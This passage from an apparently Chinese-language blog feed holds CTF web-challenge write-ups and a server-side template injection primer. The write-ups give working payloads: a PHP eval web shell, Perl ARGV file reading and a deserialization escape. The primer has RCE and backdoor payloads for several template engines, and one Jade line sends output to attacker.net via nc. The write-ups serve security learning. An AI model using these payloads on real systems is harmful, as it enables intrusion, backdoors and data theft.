20-03-18"></a>0X07ics-07 20-03-18</h4><p>打开界面，发现项目管理页面有跳转，有view-source可以看源代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">      <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[id]) &amp;&amp; floatval($_GET[id]) !== <span class="string">'1'</span> &amp;&amp; substr($_GET[id], <span class="number">-1</span>) === <span class="string">'9'</span>) &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="string">'config.php'</span>;</span><br><span class="line">        $id = mysql_real_escape_string($_GET[id]);</span><br><span class="line">        $sql=<span class="string">"select * from cetc007.user where id='$id'"</span>;</span><br><span class="line">        $result = mysql_query($sql);</span><br><span class="line">        $result = mysql_fetch_object($result);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $result = <span class="keyword">False</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span>(!$result)<span class="keyword">die</span>(<span class="string">"&lt;br &gt;something wae wrong ! &lt;br&gt;"</span>);</span><br><span class="line">      <span class="keyword">if</span>($result)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"id: "</span>.$result-&gt;id.<span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"name:"</span>.$result-&gt;user.<span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">        $_SESSION[<span class="string">'admin'</span>] = <span class="keyword">True</span>;</span><br><span class="line">      &#125;</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">floatval($_GET[id]) !== <span class="string">'1'</span><span class="comment">//浮点数不能为1</span></span><br><span class="line">substr($_GET[id], <span class="number">-1</span>) === <span class="string">'9'</span>)<span class="comment">//id的倒数最后一个数为9</span></span><br><span class="line">mysql_real_escape_string（ ）函数会在单引号前加\依次来防止sql注入</span><br><span class="line"><span class="comment">//这里可以用1/9进行绕过</span></span><br></pre></td></tr></table></figure><p>过了这一步来看下一段代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">     <span class="keyword">if</span> ($_SESSION[<span class="string">'admin'</span>]) &#123;</span><br><span class="line">       $con = $_POST[<span class="string">'con'</span>];</span><br><span class="line">       $file = $_POST[<span class="string">'file'</span>];</span><br><span class="line">       $filename = <span class="string">"backup/"</span>.$file;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span>(preg_match(<span class="string">'/.+\.ph(p[3457]?|t|tml)$/i'</span>, $filename))&#123;</span><br><span class="line">          <span class="keyword">die</span>(<span class="string">"Bad file extension"</span>);</span><br><span class="line">       &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            chdir(<span class="string">'uploaded'</span>);</span><br><span class="line">           $f = fopen($filename, <span class="string">'w'</span>);</span><br><span class="line">           fwrite($f, $con);</span><br><span class="line">           fclose($f);</span><br><span class="line">       &#125;</span><br><span class="line">     &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">$filename = <span class="string">"backup/"</span>.$file;<span class="comment">//backup是伪路径，这里用../可以绕过</span></span><br><span class="line">preg_match(<span class="string">'/.+\.ph(p[3457]?|t|tml)$/i'</span>, $filename)<span class="comment">//这一段正则真的没看懂，看了大佬的wp说是只过滤在最后一个点的后缀，可以用/.或者两个.php文件来绕过</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:file=../<span class="number">4.</span>php/.&amp;con=<span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_GET[<span class="string">'cmd'</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>访问uploaded/4.php</p><img src="/2020/03/11/%E6%94%BB%E9%98%B2daliy/15.png" class="" title="examplename"><p>用system来爆出路径下的文件，可以看到有flag.php,用cat来读取，在网页源码可以看到flag</p><p>还有一种方法是用菜刀连接，这里就不演示了</p><img src="/2020/03/11/%E6%94%BB%E9%98%B2daliy/14.png" class="" title="examplename"><h4 id="0X08i-got-id-20-03-18"><a href="#0X08i-got-id-20-03-18" class="headerlink" title="0X08i-got-id 20-03-18"></a>0X08i-got-id 20-03-18</h4><p>打开有三个跳转链接，其中一个提示是Perl，有一个是文件上传页面，应该是Perl文件上传，去百度了以下有关的知识，猜测一下后台的逻辑</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> strict;</span><br><span class="line"><span class="keyword">use</span> warnings;</span><br><span class="line"><span class="keyword">use</span> CGI;</span><br><span class="line"><span class="keyword">my</span> $cgi=CGI-&gt;new;</span><br><span class="line"><span class="keyword">if</span>($cgi-&gt;upload(<span class="string">'file'</span>))&#123;</span><br><span class="line"><span class="keyword">my</span> $file=$cgi-&gt;param(<span class="string">'file'</span>);</span><br><span class="line"><span class="keyword">while</span> (&lt;$file&gt;)&#123;<span class="keyword">print</span> <span class="string">"$_"</span>;&#125;</span><br><span class="line">&#125;</span><br><span class="line">param()函数会返回一个列表的文件但是只有第一个文件会被放入到下面的file变量中。如果我们传入一个ARGV的文件，那么Perl会将传入的参数作为文件名读出来。对正常的上传文件进行修改,可以达到读取任意文件的目的</span><br></pre></td></tr></table></figure><p>接下来上传一个argv文件再上传正常的文件，用bash来读取目录</p><img src="/2020/03/11/%E6%94%BB%E9%98%B2daliy/16.png" class="" title="examplename"><p>接着直接读取/flag，就可以了</p>]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;0X01-FlatScience-20-03-11&quot;&gt;&lt;a href=&quot;#0X01-FlatScience-20-03-11&quot; class=&quot;headerlink&quot; title=&quot;0X01: FlatScience 20-03-11&quot;&gt;&lt;/a&gt;0X01: FlatScience 20-03-11
    
    </summary>
    
    
    
      <category term="train" scheme="http://yoursite.com/tags/train/"/>
    
  </entry>
  
  <entry>
    <title>buuojdiary</title>
    <link href="http://yoursite.com/2020/02/26/buuojdiary/"/>
    <id>http://yoursite.com/2020/02/26/buuojdiary/</id>
    <published>2020-02-26T07:58:32.000Z</published>
    <updated>2020-05-14T15:21:25.152Z</updated>
    
    <content type="html"><![CDATA[<p>[0CTF piapiapia]<a id="more"></a></p><p>前几天i春秋的比赛里面有一道反序列化逃逸的题目，对于菜鸡而言真的是一脸懵逼，后来看了出题人的出题笔记，找到了这道题，废话不多说，进入正题。</p><p>分析：扫描目录，可以从返回中找到<a href="http://www.zip，从而能够得到网站的逻辑和源码" target="_blank" rel="noopener">www.zip，从而能够得到网站的逻辑和源码</a></p><p>(1)注册 (2)登录 (3)修改信息</p><p>config.php中内容:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$config[<span class="string">'hostname'</span>] = <span class="string">'127.0.0.1'</span>;</span><br><span class="line">$config[<span class="string">'username'</span>] = <span class="string">'root'</span>;</span><br><span class="line">$config[<span class="string">'password'</span>] = <span class="string">''</span>;</span><br><span class="line">$config[<span class="string">'database'</span>] = <span class="string">''</span>;</span><br><span class="line">$flag = <span class="string">''</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>大概知道了需要读取config.php来拿到flag</p><p>接下来看一下profile.php文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$profile = unserialize($profile);</span><br><span class="line">$phone = $profile[<span class="string">'phone'</span>];</span><br><span class="line">$email = $profile[<span class="string">'email'</span>];</span><br><span class="line">$nickname = $profile[<span class="string">'nickname'</span>];</span><br><span class="line">$photo = base64_encode(file_get_contents($profile[<span class="string">'photo'</span>]));</span><br></pre></td></tr></table></figure><p>从代码来看,所要做的应该就是让$profile[‘photo’]=’profile.php’，这里有一个反序列化，那么应该就是要利用反序列化漏洞来读取profile.php，这样就能得到base64加密过的信息</p><p>再来看update.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">move_uploaded_file($file[<span class="string">'tmp_name'</span>], <span class="string">'upload/'</span> . md5($file[<span class="string">'name'</span>]));</span><br><span class="line">$profile[<span class="string">'phone'</span>] = $_POST[<span class="string">'phone'</span>];</span><br><span class="line">$profile[<span class="string">'email'</span>] = $_POST[<span class="string">'email'</span>];</span><br><span class="line">$profile[<span class="string">'nickname'</span>] = $_POST[<span class="string">'nickname'</span>];</span><br><span class="line">$profile[<span class="string">'photo'</span>] = <span class="string">'upload/'</span> . md5($file[<span class="string">'name'</span>]);</span><br><span class="line"></span><br><span class="line">$user-&gt;update_profile($username, serialize($profile));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Update Profile Success!&lt;a href="profile.php"&gt;Your Profile&lt;/a&gt;'</span>;</span><br></pre></td></tr></table></figure><p>可以看出phone、email、nackname、photo都是可以进行操作的</p><p>在设置了profile的信息之后会调用这个函数进行处理：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update_profile</span><span class="params">($username, $new_profile)</span> </span>&#123;</span><br><span class="line">$username = <span class="keyword">parent</span>::filter($username);</span><br><span class="line">$new_profile = <span class="keyword">parent</span>::filter($new_profile);</span><br><span class="line"></span><br><span class="line">$where = <span class="string">"username = '$username'"</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">parent</span>::update(<span class="keyword">$this</span>-&gt;table, <span class="string">'profile'</span>, $new_profile, $where);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在filter方法中进行了过滤：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($string)</span> </span>&#123;</span><br><span class="line">$escape = <span class="keyword">array</span>(<span class="string">'\''</span>, <span class="string">'\\\\'</span>);</span><br><span class="line">$escape = <span class="string">'/'</span> . implode(<span class="string">'|'</span>, $escape) . <span class="string">'/'</span>;</span><br><span class="line">$string = preg_replace($escape, <span class="string">'_'</span>, $string);</span><br><span class="line"></span><br><span class="line">$safe = <span class="keyword">array</span>(<span class="string">'select'</span>, <span class="string">'insert'</span>, <span class="string">'update'</span>, <span class="string">'delete'</span>, <span class="string">'where'</span>);</span><br><span class="line">$safe = <span class="string">'/'</span> . implode(<span class="string">'|'</span>, $safe) . <span class="string">'/i'</span>;</span><br><span class="line"><span class="keyword">return</span> preg_replace($safe, <span class="string">'hacker'</span>, $string);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面的东西，就是根据树哥的blog来做的，根据那篇文章这道题的点应该在nickname这里,可以看到filter中会用hacker来替代数组里的东西，也就有where的地方就会挤出字符</p><p>第一个长度限制可以用数组进行绕过,也就是nickname[]</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/[^a-zA-Z0-9_]/'</span>, $_POST[<span class="string">'nickname'</span>]) || strlen($_POST[<span class="string">'nickname'</span>]) &gt; <span class="number">10</span>)</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'Invalid nickname'</span>);</span><br></pre></td></tr></table></figure><p>下面来看一下正常序列化的结果:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a=<span class="keyword">Array</span>(</span><br><span class="line"> <span class="string">'phone'</span> =&gt; <span class="string">'12345678911'</span>,</span><br><span class="line">    <span class="string">'email'</span> =&gt; <span class="string">'woc2@qq.com'</span>,</span><br><span class="line">    <span class="string">'nickname'</span> =&gt; [<span class="string">'hello'</span>],</span><br><span class="line">    <span class="string">'photo'</span> =&gt; <span class="string">'upload/'</span>.md5(<span class="string">'123.jpg'</span>)</span><br><span class="line">);</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//a:4&#123;s:5:"phone";s:11:"12345678911";s:5:"email";s:11:"woc2@qq.com";s:8:"nickname";a:1&#123;i:0;s:5:"hello";&#125;s:5:"photo";s:39:"upload/f47454d1d3644127f42070181a8b9afc";&#125;</span></span><br></pre></td></tr></table></figure><p>现在要做的就是往nickname里塞入profile.php，直接给payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a:<span class="number">4</span>&#123;s:<span class="number">5</span>:<span class="string">"phone"</span>;s:<span class="number">11</span>:<span class="string">"15000000000"</span>;s:<span class="number">5</span>:<span class="string">"email"</span>;s:<span class="number">11</span>:<span class="string">"woc2@qq.com"</span>;s:<span class="number">8</span>:<span class="string">"nickname"</span>;a:<span class="number">1</span>&#123;i:<span class="number">0</span>;s:<span class="number">204</span>:<span class="string">"wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere"</span>;&#125;s:<span class="number">5</span>:<span class="string">"photo"</span>;s:<span class="number">10</span>:<span class="string">"config.php"</span>;&#125;s:<span class="number">39</span>:<span class="string">"upload/f47454d1d3644127f42070181a8b9afc"</span>;&#125;</span><br><span class="line">这里<span class="number">34</span>个where加上<span class="string">";&#125;s:5:"</span>photo<span class="string">";s:10:"</span>config.php<span class="string">";&#125;一共204个字符，在filter方法里34个where会被hacker替代，34个hacker就有204个字符此时，"</span>;&#125;s:<span class="number">5</span>:<span class="string">"photo"</span>;s:<span class="number">10</span>:<span class="string">"config.php"</span>;&#125;不再是一大串where的一部分，s:<span class="number">5</span>:<span class="string">"photo"</span>;s:<span class="number">10</span>:<span class="string">"config.php"</span>也不是简单的字符串了，在序列化时会被解析成profile[<span class="string">'photo'</span>]=<span class="string">'config.php'</span></span><br></pre></td></tr></table></figure><p>下面就是注册登录更新信息，在profile.php中拿到base64码，解密拿到flag</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;[0CTF piapiapia]
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>RoarCTF</title>
    <link href="http://yoursite.com/2020/02/19/RoarCTF/"/>
    <id>http://yoursite.com/2020/02/19/RoarCTF/</id>
    <published>2020-02-19T10:10:44.000Z</published>
    <updated>2020-03-12T01:24:46.018Z</updated>
    
    <content type="html"><![CDATA[<h4 id="1-Easy-Java"><a href="#1-Easy-Java" class="headerlink" title="1.Easy Java"></a>1.Easy Java<a id="more"></a></h4><p>打开题目出现的是一个登录界面</p><img src="/2020/02/19/RoarCTF/java.png" class="" title="examplename"><p>点击help出现了提示:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java.io.FileNotFoundException:&#123;help.docx&#125;</span><br></pre></td></tr></table></figure><p>用burp抓包,但是怎么改都无法下载或者打开help.docx，后面尝试把GET改成了POST，成功打开了这个文件</p><p>由于题目是跟java有关系，就去百度了，找到了一篇很详细的文章，这里是重点</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">WEB-INF&#x2F;web.xml泄露</span><br><span class="line">WEB-INF是Java的WEB应用的安全目录。如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问。</span><br><span class="line">&#x2F;WEB-INF&#x2F;web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。</span><br><span class="line">&#x2F;WEB-INF&#x2F;classes&#x2F;：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中 </span><br><span class="line">&#x2F;WEB-INF&#x2F;lib&#x2F;：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件</span><br><span class="line">&#x2F;WEB-INF&#x2F;src&#x2F;：源码目录，按照包名结构放置各个java文件。</span><br><span class="line">&#x2F;WEB-INF&#x2F;database.properties：数据库配置文件</span><br></pre></td></tr></table></figure><p>尝试WEB-INF/web.xml找到了疑似flag文件的东西…</p><img src="/2020/02/19/RoarCTF/java1.png" class="" title="examplename"><p>可以看到有一个com.wm.ctf.FlagController</p><p>构造payload:<code>WEB-INF/classes/com/wm.ctf.FlagController.class</code></p><img src="/2020/02/19/RoarCTF/java2.png" class="" title="examplename"><p>可以看到一串base64编码的字符,解码即可得到flag.</p><h4 id="2-Easy-Calc"><a href="#2-Easy-Calc" class="headerlink" title="2.Easy Calc"></a>2.Easy Calc</h4><p>是一道计算器的题，直接看网页源码找到了一个叫calc.php的文件，可以访问</p><img src="/2020/02/19/RoarCTF/calc.png" class="" title="examplename"><p>可以看出payload中不能包含’ ‘, ‘\t’, ‘\r’, ‘\n’,’’’, ‘“‘, ‘`’, ‘[‘, ‘]’ 等字符,而且前面有提示说加上了WAF,这道题我们可以用%20来进行绕过WAF</p><p>接下来的内容是刚刚从一篇博客学到的新知识，在这之前并不知道(我太菜了…)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php的文件操作函数：</span><br><span class="line">getcwd — 取得当前工作目录</span><br><span class="line">dirname(string $path) — 返回 path 的父目录</span><br><span class="line">scandir — 列出指定路径中的文件和目录</span><br></pre></td></tr></table></figure><p>有了上面的这些操作函数,那么就看可以找flag了…</p><p>一层层往上找</p><img src="/2020/02/19/RoarCTF/java3.png" class="" title="examplename"><p>在这里找到了f1agg的文件,但是/是被过滤的,这里不能直接用<code>var_dump(file_get_contents(&#39;/f1agg&#39;));</code></p><p>想到了用ascii码来进行绕过,用’.’来进行拼接</p><p>payload：<code>var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))；</code></p><p>顺利拿到flag</p>]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;1-Easy-Java&quot;&gt;&lt;a href=&quot;#1-Easy-Java&quot; class=&quot;headerlink&quot; title=&quot;1.Easy Java&quot;&gt;&lt;/a&gt;1.Easy Java
    
    </summary>
    
    
    
      <category term="something import" scheme="http://yoursite.com/tags/something-import/"/>
    
  </entry>
  
  <entry>
    <title>服务端模板注入</title>
    <link href="http://yoursite.com/2020/02/12/%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/"/>
    <id>http://yoursite.com/2020/02/12/%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/</id>
    <published>2020-02-12T08:28:20.000Z</published>
    <updated>2020-03-13T09:57:17.770Z</updated>
    
    <content type="html"><![CDATA[<h4 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01:简介"></a>0x01:简介<a id="more"></a></h4><p>模板引擎用于使用动态数据呈现内容。此上下文数据通常由用户控制并由模板进行格式化，以生成网页、电子邮件等。模板引擎通过使用代码构造（如条件语句、循环等）处理上下文数据，允许在模板中使用强大的语言表达式，以呈现动态内容。如果攻击者能够控制要呈现的模板，则他们将能够注入可暴露上下文数据，甚至在服务器上运行任意命令的表达式。</p><h4 id="0x02-服务端模板引擎"><a href="#0x02-服务端模板引擎" class="headerlink" title="0x02:服务端模板引擎"></a>0x02:服务端模板引擎</h4><p><strong>PHP</strong>：Smarty、Twig；</p><p><strong>Java</strong>：Freemarker、Velocity；</p><p><strong>Python</strong>：Jinja2、Tornado、Marko；</p><p><strong>Ruby</strong>：Slim、ERB；</p><p><strong>NodeJS</strong>：Jade等</p><h4 id="0x03：注入手法（ps-这是一张找来的图片）"><a href="#0x03：注入手法（ps-这是一张找来的图片）" class="headerlink" title="0x03：注入手法（ps:这是一张找来的图片）"></a>0x03：注入手法（ps:这是一张找来的图片）</h4><p> 对于模板注入漏洞的研究可以参考SQL注入，客户端的模板注入（CSTI）只能XSS，而服务端模板注入（SSTI）则可能造成XSS、LFI和任意代码执行。</p><p> 漏洞发现及利用步骤分为：探测、判断、利用（读取、探索、攻击）</p><img src="/2020/02/12/%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/1.jpg" class="" title="examplename"><h4 id="0x04：判断漏洞"><a href="#0x04：判断漏洞" class="headerlink" title="0x04：判断漏洞"></a>0x04：判断漏洞</h4><img src="/2020/02/12/%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/2.jpeg" class="" title="examplename"><p>通过图片中的payload可以快速判断</p><p>绿线表示成功，红线失败。49会在 Twig 中返回49，而在 Jinja2 中则是7777777</p><h4 id="1x01：收集到的一些模板注入payload-具体的模板可以自行百度了解"><a href="#1x01：收集到的一些模板注入payload-具体的模板可以自行百度了解" class="headerlink" title="1x01：收集到的一些模板注入payload,具体的模板可以自行百度了解"></a>1x01：收集到的一些模板注入payload,具体的模板可以自行百度了解</h4><p>FreeMaker：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload:&lt;#assign ex&#x3D;&quot;freemarker.template.utility.Execute&quot;?new()&gt; $&#123; ex(&quot;id&quot;) &#125;</span><br><span class="line">return:uid&#x3D;119(tomcat7) gid&#x3D;127(tomcat7) groups&#x3D;127(tomcat7)</span><br></pre></td></tr></table></figure><p>Velocity:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#set($str&#x3D;$class.inspect(&quot;java.lang.String&quot;).type)</span><br><span class="line">#set($chr&#x3D;$class.inspect(&quot;java.lang.Character&quot;).type)</span><br><span class="line">#set($ex&#x3D;$class.inspect(&quot;java.lang.Runtime&quot;).type.getRuntime().exec(&quot;whoami&quot;))</span><br><span class="line">$ex.waitFor()</span><br><span class="line">#set($out&#x3D;$ex.getInputStream())</span><br><span class="line">#foreach($i in [1..$out.available()])</span><br><span class="line">$str.valueOf($chr.toChars($out.read()))</span><br><span class="line">#end</span><br><span class="line">&#x2F;&#x2F;输出 tomcat7</span><br></pre></td></tr></table></figure><p>Smarty:</p><p>1)写文件创建后门:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,&quot;&lt;?php passthru($_GET[&#39;cmd&#39;]); ?&gt;&quot;,self::clearConfig())&#125;</span><br></pre></td></tr></table></figure><p>2)任意读取文件:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;self::getStreamVariable(&quot;file:&#x2F;&#x2F;&#x2F;proc&#x2F;self&#x2F;loginuid&quot;)&#125;</span><br></pre></td></tr></table></figure><p>Twig:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;id&quot;)&#125;&#125;</span><br><span class="line"> </span><br><span class="line">&#x2F;&#x2F;返回结果： uid&#x3D;1000(k) gid&#x3D;1000(k) groups&#x3D;1000(k),10(wheel)</span><br></pre></td></tr></table></figure><p>jade:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var x &#x3D; root.process</span><br><span class="line">x &#x3D; x.mainModule.require</span><br><span class="line">x &#x3D; x(&#39;child_process&#39;)</span><br><span class="line">x.exec(&#39;id | nc attacker.net 80&#39;)</span><br></pre></td></tr></table></figure><p>python模板注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% if c.__name__ &#x3D;&#x3D; &#39;catch_warnings&#39; %&#125;</span><br><span class="line">  &#123;% for b in c.__init__.__globals__.values() %&#125;  </span><br><span class="line">  &#123;% if b.__class__ &#x3D;&#x3D; &#123;&#125;.__class__ %&#125;         &#x2F;&#x2F;遍历基类 找到eval函数</span><br><span class="line">    &#123;% if &#39;eval&#39; in b.keys() %&#125;    &#x2F;&#x2F;找到了</span><br><span class="line">      &#123;&#123; b[&#39;eval&#39;](&#39;__import__(&quot;os&quot;).popen(&quot;ls&quot;).read()&#39;) &#125;&#125;  &#x2F;&#x2F;导入cmd 执行popen里的命令 read读出数据</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">  &#123;% endfor %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><p>一些补充：</p><h3 id="flask的变量和函数"><a href="#flask的变量和函数" class="headerlink" title="flask的变量和函数"></a>flask的变量和函数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">flask 中有内置的的变量函数 ，那些特殊的变量可以实现某些功能</span><br><span class="line"></span><br><span class="line">config ：可以从模板中直接访问Flask当前的config对象：&#123;&#123;config.SQLALCHEMY_DATABASE_URL&#125;&#125;</span><br><span class="line"></span><br><span class="line">request : 就是flask中代表当前请求的request对象 ， &#123;&#123;request.url&#125;&#125;</span><br><span class="line"></span><br><span class="line">session :为Flask的session对象 ,&#123;&#123;session.new&#125;&#125; True</span><br><span class="line"></span><br><span class="line">g变量：在视图函数中设置g变量的那么属性的值，然后再模板中直接可以取出&#123;&#123;g.name&#125;&#125;</span><br><span class="line"></span><br><span class="line">url_for() : url_for会根据传入的路由器函数名，返回该路由的URL，在模板中始终使用url_for（）就可以安全的修改路由绑定的URL，则不必担心模板中渲染错的连接，&#123;&#123;url_for(&#39;home&#39;)&#125;&#125; ，如果我们定义的路由URL是带有参数的，则可以把他们作为关键字参数传入url_for（），Flask会把他们填充进最终生成的URL中，&#123;&#123;url_for(&#39;post&#39;,post_id&#x3D;1)&#125;&#125;</span><br><span class="line"></span><br><span 